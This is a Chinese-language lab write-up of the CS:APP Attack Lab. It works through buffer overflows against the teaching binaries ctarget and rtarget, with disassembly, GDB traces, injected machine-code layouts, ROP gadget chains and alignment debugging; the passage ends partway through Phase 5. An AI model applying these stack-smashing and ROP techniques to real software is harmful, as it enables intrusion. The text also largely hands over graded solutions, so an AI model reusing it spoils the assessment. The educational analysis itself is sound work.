# Attack Lab 实验复盘

> 语法约定：后续统一使用 **AT&T 汇编语法**。

## 0. 当前环境与实验文件

- 系统：WSL2 Ubuntu，x86-64 Linux
- 工具：`gcc`、`gdb`、`objdump`、`hex2raw`
- 实验目录：`AttackLab/`
- 实验文件：`ctarget`、`rtarget`、`cookie.txt`、`farm.c`、`hex2raw`
- `ctarget` 用于 Phase 1--3；`rtarget` 用于 Phase 4--5
- 本地运行使用 `-q`，避免向评分服务器发送结果：

```bash
./ctarget -q
```

本复盘不记录完整 cookie，也不把个人化输入上传到公共仓库。

## 1. Phase 1 目标

Phase 1 的目标不是修改 `getbuf` 的返回值，而是改变 `getbuf` 执行 `ret` 后的控制流：

```text
正常路径：test -> getbuf -> Gets -> getbuf ret -> test
Phase 1： test -> getbuf -> Gets -> getbuf ret -> touch1
```

`touch1` 是目标函数。通过反汇编可见，它设置关卡级别、打印成功信息、调用验证函数，最后退出；它不需要像后续 `touch2`/`touch3` 那样接收 cookie 参数。因此 Phase 1 的核心是控制流重定向。

## 2. 从 `getbuf` 反汇编建立模型

使用的静态观察命令：

```bash
objdump -d --disassemble=getbuf ./ctarget
```

得到的关键指令为：

```asm
4017a8: sub    $0x28,%rsp
4017ac: mov    %rsp,%rdi
4017af: call   401a40 <Gets>
4017b4: mov    $0x1,%eax
4017b9: add    $0x28,%rsp
4017bd: ret
```

### 2.1 栈空间分配

```asm
sub    $0x28,%rsp
```

AT&T 语法中源操作数在前、目标操作数在后，因此该指令表示：

```text
rsp = rsp - 0x28
```

`0x28` 等于 40，说明 `getbuf` 为局部输入区域预留了 40 字节。

### 2.2 `Gets` 参数来源

```asm
mov    %rsp,%rdi
call   401a40 <Gets>
```

通过指令数据流推导：

```text
当前 rsp -> 写入 rdi -> 立即调用 Gets
```

在 System V AMD64 调用约定下，第一个整数或指针参数通过 `%rdi` 传递。因此，`Gets` 从刚刚分配的栈区域起始处写入输入。

### 2.3 正常返回值

```asm
mov    $0x1,%eax
```

这条指令将 `%eax` 设为 1，构成 `getbuf` 正常路径的返回值。GDB 中实际观察到执行后：

```text
rax = 0x1
```

### 2.4 栈空间恢复与返回

```asm
add    $0x28,%rsp
ret
```

`add` 抵消入口处的 `sub`，将栈指针恢复到进入 `getbuf` 前的层级。随后 `ret` 从恢复后的栈顶取出返回控制位置。

## 3. 从 `test` 反汇编确认正常返回位置

使用的命令：

```bash
objdump -d --disassemble=test ./ctarget
```

关键指令：

```asm
401971: call   4017a8 <getbuf>
401976: mov    %eax,%edx
```

`call` 指令从 `0x401971` 开始，长度为 5 字节，所以调用完成后的下一条指令地址为 `0x401976`。正常情况下，`getbuf` 的 `ret` 会把控制流带回这里。

`test` 中的：

```asm
mov    %eax,%edx
```

也验证了 `getbuf` 返回后，返回值会被继续用于后面的打印调用。

## 4. GDB 动态验证正常路径

进入 GDB 时统一设置 AT&T 语法：

```bash
gdb -q ./ctarget
```

```gdb
set pagination off
set debuginfod enabled off
set disassembly-flavor att
break getbuf
run -q
```

### 4.1 入口处的状态

断在 `getbuf` 入口时观察到：

```text
rsp = 0x5561dca0
```

栈顶内容为：

```text
0x0000000000401976
```

结合 `test` 的反汇编，推导出这是 `call getbuf` 保存的正常返回位置。

### 4.2 单步执行栈空间分配

执行 `sub $0x28,%rsp` 前：

```text
rsp = 0x5561dca0
```

执行后：

```text
rsp = 0x5561dc78
```

差值为 `0x28`，与静态反汇编完全一致。

随后执行：

```asm
mov    %rsp,%rdi
```

观察到：

```text
rsp = 0x5561dc78
rdi = 0x5561dc78
```

这验证了 `Gets` 的输入起始位置来自当前 `%rsp`。

### 4.3 `Gets` 返回与 `ret`

使用短输入 `ABC` 观察正常路径。`getbuf` 执行：

```asm
mov    $0x1,%eax
add    $0x28,%rsp
ret
```

后：

```text
eax = 0x1
rsp 恢复到 0x5561dca0
```

执行 `ret` 后，GDB 停在：

```asm
0x401976 <test+14>: mov    %eax,%edx
```

同时观察到：

```text
rsp = 0x5561dca8
eax = 0x1
```

`rsp` 增加 8 字节，是因为 `ret` 从栈顶取出了一个 8 字节返回位置。这验证了正常控制流：

```text
getbuf ret -> 0x401976 -> test
```

## 5. 用边界探针测量返回槽偏移

为了观察输入如何覆盖栈，生成了一个仅用于测量边界的输入：

```text
32 个 A + 8 个 B
```

在 `Gets` 返回后、`getbuf` 设置返回值前暂停，观察到：

```text
0x5561dc78: 0x4141414141414141
0x5561dc80: 0x4141414141414141
0x5561dc88: 0x4141414141414141
0x5561dc90: 0x4141414141414141
0x5561dc98: 0x4242424242424242
0x5561dca0: 0x0000000000401900
```

从 `0x5561dc78` 开始：

```text
偏移 0--31：A
偏移 32--39：B
偏移 40：原保存返回位置所在区域
```

原本在 `0x5561dca0` 的返回位置是 `0x401976`。边界探针的换行结束和字符串终止字节使其最低字节发生变化，观察到 `0x401900`，说明输入已经触碰到返回槽。

由地址差值也可直接得到：

```text
0x5561dca0 - 0x5561dc78 = 0x28
```

因此 Phase 1 的控制流布局模型为：

```text
[缓冲区起点 + 0x28 字节填充][返回控制位置]
```

## 6. `touch1` 目标分析

使用 GDB：

```gdb
info address touch1
disassemble touch1
```

观察到 `touch1` 的入口地址为本实例中的符号地址，并且函数执行后直接完成 Level 1 验证并退出。关键结论是：

- Phase 1 需要让 `getbuf` 的 `ret` 读取 `touch1` 入口地址；
- 不需要向 `touch1` 传递 cookie 参数；
- 地址写入内存时要遵守 x86-64 小端序；
- 返回槽是 8 字节宽度，不能只放地址的低 3 个字节。

## 7. 十六进制输入与原始字节

`hex2raw` 的作用是把十六进制文本转换为目标程序读取的原始字节：

```bash
./hex2raw < phase1.hex > phase1.raw
```

`phase1.hex` 中的每个两位十六进制 token 表示一个字节，token 之间用空格或换行分隔。使用：

```bash
wc -c phase1.raw
xxd -g 1 phase1.raw
```

检查原始文件的长度和字节排列。

本次检查确认：

```text
40 字节填充
+ 8 字节、小端序排列的目标地址
+ 最后的换行字节 0x0a
```

原始文件总长度为 49 字节。最后的 `0x0a` 用于结束 `Gets` 的输入，不属于前 48 个控制流相关字节。

## 8. Phase 1 本地验证结果

使用本地模式运行：

```bash
./ctarget -q < phase1.raw
```

得到：

```text
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
```

这证明：

```text
输入写入栈缓冲区
→ 覆盖 getbuf 保存的返回控制位置
→ getbuf 执行 ret
→ 控制流转移到 touch1
→ Level 1 验证通过
```

由于使用了 `-q`，程序只打印了“Would have posted”的模拟提交信息，没有向评分服务器发送结果。

## 9. 本次踩坑记录

### 9.1 Shell 多行命令中的反斜杠

错误形式：

```bash
objdump -d \ --disassemble=test \ --disassemble=getbuf \ ./ctarget
```

反斜杠后有空格，Shell 没有把它解释为续行，导致 `objdump` 将参数误认为文件名。

正确形式是把反斜杠放在行末：

```bash
objdump -d \
  --disassemble=getbuf \
  ./ctarget
```

或直接写成一行：

```bash
objdump -d --disassemble=getbuf ./ctarget
```

### 9.2 GDB 拼写与断点

- `dubuginfod` 是拼写错误，正确为 `debuginfod`；
- `ser` 是拼写错误，正确为 `set`；
- 没有 `break getbuf` 时，`run -q` 会直接运行到程序结束，此后不能查看寄存器；
- 只有程序在断点或单步处于暂停状态时，`info registers` 才有当前运行上下文。

### 9.3 `x` 命令省略地址

曾输入：

```gdb
x/8gx
```

省略地址时，GDB 会沿用上一次 `x` 命令的地址，可能导致查看到 `_IO_2_1_stdin_` 等无关区域。后续应明确写出：

```gdb
x/8gx $rsp
```

### 9.4 记录快照

后续每次单步前后都记录：

```gdb
x/i $pc
info registers rsp rbp rdi rax
x/8gx $rsp
```

调试的关键不是单独执行命令，而是比较指令执行前后的状态变化。

## 10. Phase 2：向 `touch2` 传递 cookie

### 10.1 `touch2` 的参数数据流

`touch2` 的关键指令为：

```asm
4017f0: mov    %edi,%edx
4017fc: cmp    0x202ce2(%rip),%edi        # cookie
401802: jne    401824 <touch2+0x38>
```

进入 `touch2` 时，`%edi` 必须等于本实例 cookie 的 32 位值。`touch2` 先将原始 `%edi` 复制到 `%edx`，因为后续调用打印函数时会把 `%edi` 改成打印检查级别 `1`；之后还会分别把 `%edi` 设置为 `2` 传给 `validate`，设置为 `0` 传给 `exit`。这些值属于不同函数调用的参数，不是 cookie 本身。

### 10.2 生成注入机器码

使用 AT&T 汇编骨架生成机器码：

```asm
movl   $COOKIE_VALUE, %edi
ret
```

对应结构为：

```text
bf [cookie 的 4 个小端字节] c3
```

这段代码长度为 6 字节。最初的布局为：

```text
[6 字节注入代码][34 字节填充][缓冲区地址 B][touch2 地址]
```

其中 `B` 是 `getbuf` 输入缓冲区的运行时地址，不能使用 `phase2-code.o` 中的重定位偏移 `0x0`。

### 10.3 第一次尝试：控制流成功但栈对齐错误

第一次尝试的控制流为：

```text
getbuf ret -> B 处注入代码 -> touch2
```

输出证明核心攻击已经成功：

```text
Touch2!: You called touch2(...)
Valid solution for level 2 with target ctarget
```

但验证完成后出现段错误。GDB 的 `bt` 给出可信的前几层：

```text
__vsprintf_internal
___sprintf_chk
sprintf
notify_server
validate
 touch2
```

调用链说明：cookie 比较和 `touch2` 已经成功，崩溃发生在验证结果格式化输出阶段。`bt` 往后的帧由于 ret 链不具备普通 `call` 建立的完整调用帧，可靠性较低。

崩溃指令为：

```asm
movaps %xmm0,-0x40(%rbp)
```

当时：

```text
rbp = 0x55619b68
rbp - 0x40 = 0x55619b28
(0x55619b28 & 0xf) = 0x8
```

`movaps` 一次移动 16 字节，要求目标地址满足 16 字节对齐；低四位为 `0x8` 表明目标地址偏离 16 字节边界。因此旧链虽然完成了 Phase 2 的控制流和参数设置，却让进入后续函数时的栈对齐偏移了 8 字节。

更具体地说，设缓冲区起点为 `B`，且 `B & 0xf = 0x8`：

```text
旧链第一次 ret：rsp = B + 0x30
旧链第二次 ret 进入 touch2：rsp = B + 0x38，低四位为 0x0
```

普通 `call` 进入函数时，调用者在执行 `call` 前通常使 `%rsp % 16 = 0`，`call` 压入 8 字节返回地址后，被调用者入口看到 `%rsp % 16 = 8`。旧链通过 `ret` 进入 `touch2` 时没有满足这一 ABI 入口约定。

### 10.4 修正：用 `push` 调整栈再 `ret`

将注入代码改为：

```asm
movl   $COOKIE_VALUE, %edi
pushq  $TOUCH2_ADDRESS
ret
```

机器码结构为：

```text
bf [cookie 小端字节] 68 [touch2 地址的 push 编码] c3
```

这段代码共 11 字节。`pushq` 在运行时先让 `%rsp -= 8`，再把 `touch2` 地址写入新的栈顶；随后 `ret` 从该栈顶取出地址进入 `touch2`。

修正后的输入布局为：

```text
[11 字节注入代码][29 字节填充][B 的 8 字节小端表示]
```

总长度为：

```text
11 + 29 + 8 = 48 字节
```

修正后的控制流和栈变化：

```text
getbuf ret：pc = B，rsp = B + 0x30
pushq touch2：rsp = B + 0x28，[rsp] = touch2
注入代码 ret：pc = touch2，rsp = B + 0x30，低四位为 0x8
```

这样进入 `touch2` 时恢复了符合 ABI 的栈对齐状态，后续 `movaps` 不再崩溃。

### 10.5 Phase 2 验证

使用：

```bash
./hex2raw < phase2.hex > phase2.raw
wc -w phase2.hex
xxd -g 1 -c 16 phase2.raw
./ctarget -q < phase2.raw
```

最终输出包含：

```text
Touch2!: You called touch2(...)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
```

说明 Phase 2 已通过本地验证。`PASS: Would have posted` 只表示 `-q` 模式下打印模拟提交内容，没有实际连接评分服务器。

## 11. 本次踩坑记录补充

### 11.1 `phase2-code.o` 的 `0x0` 不是运行时地址

目标文件中的：

```text
0000000000000000 <phase2_code>
```

是可重定位目标文件内部偏移。注入机器码最终由 `Gets` 写入 `ctarget` 的栈缓冲区，因此第一次 `ret` 必须跳到缓冲区运行时地址 `B`。

### 11.2 `bt` 的用途

`bt` 用来回溯当前函数的调用链。此次它帮助确认：

```text
touch2 -> validate -> notify_server -> sprintf -> __vsprintf_internal
```

从而将问题定位到验证成功后的库函数调用，而不是 cookie 或第一次控制流转移。对于手工 ret 链，较深的旧栈帧可能无法可靠恢复。

## 12. Phase 2 调试结论：为什么第一次会段错误

这一节专门记录第一次 Phase 2 尝试的失败原因，避免把“已经进入 `touch2`”误认为“整个阶段已经正常结束”。

### 12.1 旧方案的执行链

旧注入代码是：

```asm
movl   $COOKIE_VALUE, %edi
ret
```

旧输入布局为：

```text
[6 字节代码][34 字节填充][B][touch2 地址]
```

设缓冲区起点为 `B`，本次观察到 `B = 0x5561dc78`，因此：

```text
B & 0xf = 0x8
```

`getbuf` 的返回槽位于 `B + 0x28`。

第一次 `ret` 的抽象效果：

```text
读取 [B+0x28] = B
跳到 B
rsp = B + 0x30
```

注入代码中的 `movl` 不改变 `%rsp`。第二次 `ret` 读取 `[B+0x30]` 中的 `touch2` 地址，因此：

```text
旧方案进入 touch2 时：rsp = B + 0x38
rsp % 16 = 0
```

这条链在控制流和参数上是成功的：输出显示 `Touch2!`，cookie 比较成功，并进入 `validate(2)`。

### 12.2 普通 `call` 的 ABI 对齐模型

System V AMD64 ABI 要求函数调用保持 16 字节栈对齐。正常的调用过程可以抽象为：

```text
调用者执行 call 前：rsp % 16 = 0
call 压入 8 字节返回地址
被调用者入口：rsp % 16 = 8
被调用者执行 sub $0x8,%rsp
后续 call 前：rsp % 16 = 0
```

`touch2` 的函数序言正是：

```asm
sub    $0x8,%rsp
```

旧方案却让 `touch2` 入口处的 `rsp % 16 = 0`。因此执行其序言后变成：

```text
touch2 入口：rsp % 16 = 0
sub $0x8：rsp % 16 = 8
后续 call 前：rsp % 16 = 8   （偏离 ABI 预期）
```

也就是说，问题不在 cookie、不在 `touch2` 地址，也不在第一次 `ret`；问题是手工 `ret` 链进入 `touch2` 时，比正常 `call` 入口少了/多了一个 8 字节的栈相位。

### 12.3 为什么最终在 `movaps` 处崩溃

GDB 现场为：

```asm
movaps %xmm0,-0x40(%rbp)
```

调用回溯的可信部分为：

```text
touch2
  -> validate
    -> notify_server
      -> sprintf
        -> __vsprintf_internal
```

现场寄存器：

```text
rbp = 0x55619b68
rsp = 0x55619b28
```

故障指令的目标地址是：

```text
rbp - 0x40 = 0x55619b28
```

而：

```text
0x55619b28 & 0xf = 0x8
```

`movaps` 一次移动 16 字节，要求目标地址按 16 字节对齐，即低四位应为 `0x0`。由于实际目标地址低四位为 `0x8`，C 库在格式化验证结果时触发了段错误。

因此，之前的输出顺序：

```text
Touch2!
Valid solution ...
Ouch!: You caused a segmentation fault!
```

并不矛盾：前两行只证明 `touch2` 的比较和验证逻辑已经成功；验证结束后还要执行结果格式化，错误的栈对齐在该阶段才被 `movaps` 暴露出来。

### 12.4 `bt` 输出如何帮助定位

`bt`（backtrace）不是修复命令，而是列出当前函数的调用链。此次输出的前几层：

```text
#0 __vsprintf_internal
#1 ___sprintf_chk
#2 sprintf
#3 notify_server
#4 validate
#5 touch2
```

从 `#5` 向 `#0` 读，得到：

```text
touch2 -> validate -> notify_server -> sprintf -> __vsprintf_internal
```

这排除了“注入代码没有执行”以及“cookie 比较失败”等方向。由于手工 `ret` 链不具备普通 `call` 建立的完整栈帧，`#6` 往后的回溯可能只是 GDB 根据残留栈数据做出的不可靠推断；定位时以 `#0` 到 `#5` 为主。

### 12.5 修正方案为何有效

修正后的注入代码为：

```asm
movl   $COOKIE_VALUE, %edi
pushq  $TOUCH2_ADDRESS
ret
```

`pushq` 在运行时执行：

```text
rsp = rsp - 8
[rsp] = touch2 地址
```

然后 `ret` 从新栈顶取出 `touch2` 地址。修正链的关键状态为：

```text
第一次 ret 后进入 B：rsp = B + 0x30
pushq touch2 后：    rsp = B + 0x28
注入代码 ret 进入 touch2：rsp = B + 0x30，rsp % 16 = 8
```

因此 `touch2` 入口重新符合普通 `call` 的入口相位；其 `sub $0x8,%rsp` 会把后续调用前的 `%rsp` 调整到 16 字节对齐。新的 11 字节代码加 29 字节填充和 8 字节 `B` 地址，共 48 个有效字节，最终本地验证通过且不再段错误。

## 13. Phase 3：向 `touch3` 传递 cookie 字符串

### 13.1 目标从数值参数变为字符串指针

Phase 2 要求进入 `touch2` 时：

```text
%edi = cookie 数值
```

Phase 3 的 `touch3` 接收的是 `char *sval`，因此进入 `touch3` 时需要：

```text
%rdi = 用户字符串地址
```

该地址指向的内容必须是：

```text
8 个十六进制 ASCII 字符 + 00
```

不带 `0x` 前缀，也不是 cookie 的 4 个二进制字节。字符串按正常字符顺序存放，只有地址和整数机器码使用小端序。

### 13.2 `touch3` 到 `hexmatch` 的参数数据流

`touch3` 中的关键指令：

```asm
4018fa: push   %rbx
4018fb: mov    %rdi,%rbx
401908: mov    %rdi,%rsi
40190b: mov    cookie,%edi
401911: call   40184c <hexmatch>
```

进入 `touch3` 时 `%rdi` 是用户字符串地址。`touch3` 先将它保存到 `%rbx`，随后复制到 `%rsi`；再将 cookie 数值放入 `%edi`，作为 `hexmatch` 的第一个参数。因此进入 `hexmatch` 时：

```text
%edi = cookie 数值
%rsi = 用户字符串地址
```

`hexmatch` 开头：

```asm
401854: mov    %edi,%r12d
401857: mov    %rsi,%rbp
```

所以在 `hexmatch` 内部：

```text
%r12d = cookie 数值
%rbp  = 用户字符串地址
```

这里的 `%rbp` 不是 `cbuf` 起点；它被当作普通寄存器保存用户字符串指针。

### 13.3 `hexmatch` 的局部区域和随机字符串

`hexmatch` 开头的栈序列为：

```asm
push   %r12
push   %rbp
push   %rbx
add    $0xffffffffffff ff80,%rsp
```

最后一条中的 `0xffffffffffff ff80` 是 `-0x80` 的补码，因此实际效果是：

```text
保存三个寄存器：3 * 8 = 24 字节
分配局部区域：0x80 = 128 字节
总计：152 字节
```

函数随后通过 `random()` 和乘法/移位优化计算 `random() % 100`。不需要手算其中的魔数；整体效果是：

```text
rcx = random() % 100
rbx = 当前局部栈区域起点 + rcx
```

`%rbx` 指向程序生成 cookie 字符串的随机位置，而不是用户字符串。

### 13.4 `sprintf` 和 `strncmp` 比较的两份字符串

`sprintf` 调用前的寄存器准备使效果近似：

```c
sprintf(random_location, "%.8x", cookie);
```

程序在 `%rbx` 指向的位置生成：

```text
8 个十六进制 ASCII 字符 + 00
```

随后：

```asm
4018c4: mov    $0x9,%edx
4018c9: mov    %rbx,%rsi
4018cc: mov    %rbp,%rdi
4018cf: call   strncmp@plt
```

根据调用约定，实际比较为：

```c
strncmp(user_string, generated_cookie_string, 9);
```

因此：

```text
%rbp -> 用户字符串
%rbx -> 程序随机生成的字符串
```

比较的是两个地址指向的内容，不是两个地址是否相等。

### 13.5 为什么用户字符串放在 `B+0x30`

设 `B` 是 `getbuf` 缓冲区起点。返回槽位于 `B+0x28`。第一次 `ret` 从 `[B+0x28]` 读取 `B` 后：

```text
pc = B
rsp = B + 0x30
```

因此注入代码的第一条指令可以使用：

```asm
mov    %rsp,%rdi
```

得到：

```text
%rdi = B + 0x30
```

将用户字符串放在 `B+0x30`，就不需要把一个栈地址硬编码进机器码。`push $touch3` 会把栈指针从 `B+0x30` 减到 `B+0x28`，覆盖已经被第一次 `ret` 使用过的旧槽位，再由 `ret` 进入 `touch3`；它不会覆盖位于更高地址 `B+0x30` 的字符串。

该位置可能覆盖 `test` 原本不再使用的栈槽，但 `touch3` 成功/失败路径最终调用 `exit(0)`，不会再返回到 `test`。真正必须保持有效的是用户字符串，因为 `hexmatch` 后续要通过 `%rbp` 指向它并执行 `strncmp`。

### 13.6 Phase 3 输入布局和机器码

注入代码使用：

```asm
mov    %rsp,%rdi
pushq  $TOUCH3_ADDRESS
ret
```

机器码长度为 9 字节，布局为：

```text
偏移 0x00--0x08：9 字节注入代码
偏移 0x09--0x27：31 字节填充
偏移 0x28--0x2f：B 的 8 字节小端表示
偏移 0x30--0x37：8 个 ASCII 十六进制字符
偏移 0x38：00
```

有效长度：

```text
9 + 31 + 8 + 9 = 57 字节
```

字符串区域按正常顺序写入；地址仍按小端序写入。`hex2raw` 可能在有效内容后追加 `0a`，但字符串终止符必须是位于 `0x38` 的 `00`。

### 13.7 GDB 参数验证

使用断点：

```gdb
break *touch3
run -q < phase3.raw
info registers rsp rdi
x/s $rdi
```

实际观察到：

```text
touch3 (sval=... "59b997fa")
rsp 与 rdi 指向用户字符串地址
```

这验证了：

```text
mov %rsp,%rdi 执行成功
%rdi 指向正确的 8 字符字符串
```

过程中出现的 `inffo` 是 `info` 的拼写错误；`visible.c: 没有那个文件或目录` 只是调试信息引用的源文件不在发布包中，不影响断点和寄存器观察。

### 13.8 Phase 3 本地验证

使用：

```bash
./hex2raw < phase3.hex > phase3.raw
./ctarget -q < phase3.raw
```

最终输出包含：

```text
Touch3!: You called touch3("...")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
```

因此 Phase 3 已经通过本地验证。`-q` 模式下最后的 `PASS: Would have posted` 仍然只是模拟提交，不是远程上传。

## 14. Phase 4：在 `rtarget` 上使用 ROP

### 14.1 与 Phase 2 的区别

Phase 4 的目标仍然是进入 `touch2` 时让 `%edi` 等于 cookie，但不能再执行写入栈中的自定义机器码。`rtarget` 使用栈地址随机化和不可执行栈，因此输入中的字节只能作为数据使用；真正执行的指令必须来自 `rtarget` 代码段中的 gadget。

ROP gadget 是已有机器码中从某个入口开始、以 `ret` 结束的短指令序列。由于 x86-64 指令是变长的，可以从一个函数机器码的中间字节开始重新解码。

### 14.2 确认 farm 范围

使用：

```bash
nm -C ./rtarget | grep -E ' (getbuf|touch2|start_farm|mid_farm|end_farm)$'
```

得到本实例关键地址：

```text
start_farm = 0x401994
mid_farm   = 0x4019d0
end_farm   = 0x401ab2
touch2     = 0x4017ec
getbuf     = 0x4017a8
```

Phase 4 先在 `start_farm` 到 `mid_farm` 范围内寻找 gadget。使用：

```bash
objdump -d \
  --start-address=0x401994 \
  --stop-address=0x4019d0 \
  ./rtarget
```

### 14.3 变长指令和重叠解码

`addval_273` 的函数入口反汇编为：

```asm
4019a0: 8d 87 48 89 c7 c3    lea    -0x3c3876b8(%rdi),%eax
4019a6: c3                    ret
```

从函数入口 `0x4019a0` 开始，`48 89 c7 c3` 被当作前一条 `lea` 的立即数字节；但如果把 `0x4019a2` 放入 ROP 栈，CPU 会从该中间地址重新解码：

```asm
4019a2: 48 89 c7    mov    %rax,%rdi
4019a5: c3          ret
```

因此 gadget 地址不是靠记忆，而是通过：

```text
查看 farm 原始字节
→ 从候选中间地址重新反汇编
→ 确认“有用指令 + ret”
→ 记录入口地址和栈消耗
```

GDB 验证命令：

```gdb
set disassembly-flavor att
x/4i 0x4019a2
x/4i 0x4019ab
x/8bx 0x4019a2
x/4bx 0x4019ab
```

### 14.4 找到的两个 gadget

从 `addval_219` 的中间字节：

```text
0x4019ab: 58 90 c3
```

得到：

```asm
pop    %rax
nop
ret
```

其中：

```text
pop：rsp += 8，并把一个 8 字节栈槽读入 rax
nop：不改寄存器、内存或 rsp
ret：再消耗一个 8 字节栈槽并跳转
总栈消耗：16 字节
```

从 `addval_273` 的中间字节：

```text
0x4019a2: 48 89 c7 c3
```

得到：

```asm
mov    %rax,%rdi
ret
```

它将 `%rax` 的值复制到 `%rdi`，然后通过 `ret` 转到下一个栈地址；总栈消耗为 8 字节。

`nop` 不需要在 ROP 栈中单独占槽位；它只是 gadget 内部的一条无副作用指令。

### 14.5 Phase 4 的 ROP 数据流

设：

```text
A = 0x4019ab       # pop %rax; nop; ret
M = 0x4019a2       # mov %rax,%rdi; ret
T = 0x4017ec       # rtarget 的 touch2
C = 本实例 cookie 数值
```

目标数据流为：

```text
栈中的 C
  → pop %rax
  → %rax = C
  → mov %rax,%rdi
  → %rdi = C
  → touch2
```

`getbuf` 的返回槽仍然在输入缓冲区起点后的 `0x28` 字节处。ROP 栈布局为：

```text
偏移 0x00--0x27：40 字节填充
偏移 0x28--0x2f：A
偏移 0x30--0x37：C，8 字节零扩展整数
偏移 0x38--0x3f：M
偏移 0x40--0x47：T
```

有效数据长度为：

```text
40 + 8 + 8 + 8 + 8 = 72 字节
```

这里的 cookie 是整数栈槽，不是 Phase 3 的 ASCII 字符串。

### 14.6 第一次端序错误与 GDB 定位

第一次生成的输入把 8 字节值按人类从高位到低位的顺序写入，导致 `getbuf` 的 `ret` 读取到了错误地址。GDB 现场：

```text
rsp = 0x7ffffff8d5c8
[rsp] = 0x4019ab0000000000
```

对应原始字节：

```text
00 00 00 00 00 ab 19 40
```

正确的小端字节应为：

```text
ab 19 40 00 00 00 00 00
```

cookie 栈槽也曾写反。错误字节：

```text
00 00 00 00 fa 97 b9 59
```

正确的 8 字节零扩展小端形式为：

```text
fa 97 b9 59 00 00 00 00
```

因此第一次 SIGSEGV 发生在 `getbuf` 的 `ret`，而不是 gadget 内部；当时第一个返回地址已经被端序错误破坏。

### 14.7 GDB 动态验证 ROP 数据流

修正端序后，在 GDB 中设置：

```gdb
break touch2
break *0x4019ab
run -q < phase4.raw
```

程序首先停在：

```asm
0x4019ab: pop %rax
```

此时观察到：

```text
rsp = 0x7ffffffe7610
[rsp] = 0x0000000059b997fa
```

说明 `pop %rax` 将栈中的 cookie 取值过程正确。继续执行后停在 `rtarget` 的 `touch2`：

```text
touch2 (val=1505335290)
rdi = 0x59b997fa
rsp = 0x7ffffffe7628
```

因此：

```text
getbuf ret → pop %rax; nop; ret
→ mov %rax,%rdi; ret
→ touch2
```

数据流正确。

### 14.8 为什么 72 字节没有像 Phase 2 第一次尝试那样段错误

是否段错误不由输入总长度决定，而由控制流中 `ret`、`pop`、`push` 对 `%rsp` 的累计变化决定：

```text
ret：rsp += 8
pop：rsp += 8
push：rsp -= 8
nop：rsp 不变
```

Phase 2 第一次方案只有：

```text
getbuf ret → 注入代码 ret → touch2
```

在本实例中进入 `touch2` 时的栈对齐相位错误，后续 `validate` 的格式化输出在 libc 的：

```asm
movaps %xmm0,-0x40(%rbp)
```

处因目标地址未按 16 字节对齐而段错误。后来 Phase 2 使用运行时 `pushq touch2; ret` 修正了这 8 字节相位。

Phase 4 的链条是：

```text
getbuf ret
→ pop %rax（+8）
→ gadget A ret（+8）
→ gadget B ret（+8）
→ touch2
```

实际进入 `touch2` 时：

```text
rsp = 0x7ffffffe7628
rsp & 0xf = 0x8
```

符合普通 `call` 进入函数时的入口栈相位。`touch2` 执行自身的 `sub $0x8,%rsp` 后，后续库函数调用前恢复到 16 字节对齐，因此没有发生 Phase 2 第一次尝试的 `movaps` 段错误。

`rtarget` 中看到的 `0x7fff...` 是随机化的用户栈地址，不应硬编码到 Phase 4 输入；ROP 使用的是固定代码段地址 `0x4019ab`、`0x4019a2` 和 `touch2`。

### 14.9 Phase 4 本地验证

使用：

```bash
./hex2raw < phase4.hex > phase4.raw
./rtarget -q < phase4.raw
```

最终得到：

```text
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
[Inferior 1 ... exited normally]
```

因此 Phase 4 已经本地验证通过；`-q` 下的 `PASS: Would have posted` 仍然是模拟提交而不是远程上传。

## 15. Phase 5：通过 ROP 动态计算字符串地址

### 15.1 Phase 5 的目标

Phase 5 回到 `touch3`，但不能像 Phase 3 那样执行写入栈中的自定义代码。`rtarget` 的栈地址随机且栈不可执行，因此只能使用 gadget farm 中已有的指令片段。

进入 `touch3` 时仍需满足：

```text
%rdi = 正确 cookie 字符串的地址
```

但不能把某次 GDB 观察到的绝对栈地址硬编码进输入。核心思路是动态计算：

```text
字符串地址 = 当前 rsp + 固定相对偏移
```

### 15.2 从目标反推 gadget 需求

`touch3(char *sval)` 要求 `%rdi` 指向：

```text
8 个十六进制 ASCII 字符 + 00
```

因此先写出高层数据流：

```text
取得当前 rsp
→ 保存为基准地址
→ 从 ROP 栈读取字符串相对偏移
→ 把偏移转移到加法 gadget 所需的寄存器
→ 基准地址 + 偏移
→ 将结果放入 %rdi
→ ret 到 touch3
```

这比直接猜机器码更可靠：先由 `touch3` 的参数要求反推出数据流，再在 farm 中寻找对应 gadget。

### 15.3 后半段 farm 中找到的 gadget

Phase 5 将搜索范围扩展到 `mid_farm` 到 `end_farm`。使用 GDB 从候选中间地址重新反汇编，确认以下 gadget：

```text
0x401a06: mov %rsp,%rax; ret
0x4019d6: lea (%rdi,%rsi,1),%rax; ret
0x4019a2: mov %rax,%rdi; ret
0x4019ab: pop %rax; nop; ret
0x401a42: mov %eax,%edx; test %al,%al; ret
0x401a34: mov %edx,%ecx; cmp %cl,%cl; ret
0x401a13: mov %ecx,%esi; nop; nop; ret
0x4018fa: touch3
```

这些 gadget 的作用是：

```text
0x401a06：动态取得当前 rsp，避免硬编码随机栈地址
0x4019a2：将基准地址转入 rdi
0x4019ab：从栈中取相对偏移
0x401a42/0x401a34/0x401a13：通过 movl 链把偏移传到 esi
0x4019d6：计算 rdi + rsi
0x4019a2：将最终字符串地址转入 rdi
0x4018fa：进入 touch3
```

直接搜索 `movq %rax,%rsi` 和 `popq %rsi` 没有结果，因此不能强行使用理想链；实际 farm 通过：

```text
rax → edx → ecx → esi
```

间接传递偏移。由于偏移是较小的 32 位非负数，`movl` 对目标 64 位寄存器高位清零不会破坏该偏移的含义。

### 15.4 Phase 5 的 ROP 链与偏移

本次使用的 ROP 顺序为：

```text
G1 = 0x401a06       mov %rsp,%rax; ret
G2 = 0x4019a2       mov %rax,%rdi; ret
G3 = 0x4019ab       pop %rax; nop; ret
OFFSET = 0x48
G4 = 0x401a42       mov %eax,%edx; test %al,%al; ret
G5 = 0x401a34       mov %edx,%ecx; cmp %cl,%cl; ret
G6 = 0x401a13       mov %ecx,%esi; nop; nop; ret
G7 = 0x4019d6       lea (%rdi,%rsi,1),%rax; ret
G8 = 0x4019a2       mov %rax,%rdi; ret
T  = 0x4018fa        touch3
```

设输入缓冲区起点为 `B`。`getbuf` 返回槽仍位于 `B+0x28`。有效布局为：

```text
B+0x00--0x27：40 字节填充
B+0x28：G1
B+0x30：G2
B+0x38：G3
B+0x40：0x48，作为 G3 的 pop 数据
